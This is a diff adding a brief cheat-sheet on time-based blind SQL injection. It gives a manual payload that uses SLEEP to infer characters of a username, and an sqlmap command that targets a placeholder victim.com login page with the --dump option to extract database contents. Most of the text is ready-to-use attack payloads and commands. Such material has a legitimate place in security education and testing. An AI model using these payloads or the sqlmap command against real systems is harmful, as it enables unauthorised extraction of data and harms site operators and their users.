@@ -1,0 +1,14 @@
+Time-Based Blind SQL Injection
+
+Idea: Instead of relying on visible differences, rely on delays.
+
+Manual Payload Example:
+
+' OR IF(SUBSTRING(username,1,1)='a', SLEEP(5), 0)--
+
+
+If first character is a, the DB sleeps 5 seconds → attacker learns it’s true.
+
+sqlmap Command:
+
+sqlmap -u "http://victim.com/login.php" --data="username=admin&password=pass" -p username --technique=T --dump
